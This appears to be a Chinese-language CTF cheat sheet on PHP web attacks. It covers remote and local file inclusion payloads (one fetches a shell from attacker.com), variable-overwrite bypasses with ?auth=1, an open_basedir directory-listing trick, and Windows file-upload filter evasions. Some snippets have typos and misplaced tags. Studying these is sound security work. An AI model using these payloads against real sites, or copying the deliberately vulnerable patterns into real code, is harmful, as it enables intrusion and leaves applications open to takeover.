



### php伪协议
* 条件
> allow_url_include = 1

* 参数
``` 

?file=http://attacker.com/shell.jpg
?file=zip://attacker.com/shell.php
# 本地文件包含
php://filter/convert.base64-encode/resource=index.php
```
----
### 变量漏洞

#### 函数使用不当
1. extract函数
```
<？php
$auth = false;
extract($_GET);
if($auth){
	echo "flag{..}"
}else {
	echo "access Denied";
}
?>
```
* 构建payload
> ?auth=1

2. parse_str函数
```
<?php 
$auth = false;
parse_str($_SERVER['QUERY_STRING']);
if($auth){
	echo "flag{...}";
}else{
	echo "access Denied";
}
?>
```
* 构建payload
> ?auth=1

3. import_request_variables函数
```
<?php 
$auth = false;
import_request_variables('G');
if($auth){
	echo "flag{...}";
}else{
	echo "access Denied";
}
?>
```
> G代表GET、P代表POST、C代表Cookies.排在前面的字符会覆盖后面的字符，如：GP，POST请求会忽略。

#### 配置不当
* 环境
> PHP < 5.4  
* 影响参数
> register_globals=ON

* 效果
```
<?php 
if($auth) {
	echo "flag{...}";
} else {
	echo "access Denied";
}
?>
```
> 用户传入参数auth=1即可进入if语句块。如果在if语句块前初始化￥auth变量，则不会出发这个漏洞


#### 代码逻辑漏洞

* 环境
> PHP 
* 影响参数
> $$  
> 可变变量可以浪一个普通的变量的值作为这个可变变量的变量名

* 效果
```
<?php 
$auth = false;
foreach($_GET as $key => $value){
	$$key = $value;
}
if($auth) {
	echo "flag{...}";
} else {
	echo "access Denied";
}
?>
```
* payload
> ?auth=1

----
### 防护绕过

#### open_basedir
* 环境
> PHP 
* 影响参数
> open_basedir  : 防御PHP跨目录进行文件读写方法
> disable_function  : 
* 利用方法
> DirectoryIteratior + Glob
* 效果
```
<?php 
printf('<b>opeen_basedir:%s</b><br/>', ini_get('open_basedir'));
$file_list = array();
$it = new DirecoryIterator("glob:///*");
foreach($it as $f){
	$file_list[] = $f->__toString();
}

$it = new DirecoryIterator("glob:///.*");
foreach($it as $f){
	$file_list[] = $f->__toString();
}
?>

sort($file_list);
foreach($file_list as $f){
	echo "{$f}<br/>"
}
```
#### disable_function  
* 环境
> PHP 
* 影响参数
> disable_function : 禁用危险函数（system、exec、shell_exec）
* 利用方法
> 1. shellshook、imagemagick
> 2. LD_PRELOAD

----
### Windows系统特性
#### 短文件名
* 描述
> Windows以8.3格式生成与MS-Dos兼容的段文件名，以允许MS-Dos或16位Windows的程序访问这些文件
> cmd下dir/x可看到短文件名的效果

* 利用方法
> https://github.com/likoekoe//IIS_shortname_Scanner

> Windows下的Apache环境里，除了能爆破服务器文件，还能通过短文件下载长文件
#### 文件上传
* 描述
> 上传的时候如果以黑名单的形式限制后缀，可以利用文件系统的特性去绕过
* 利用方法
> 上传的时候在php后面追歼高位字符[\x80-\xff]，或者"::$data" 利用":$DATA Alternate Data Stream", 参考OWASP

> 特殊的符号冒号，如果我们上传的时候后缀改为".php:.png"形式，系统最后得到的是0字符的php后缀文件，起到了截断效果，但是没能写入内容

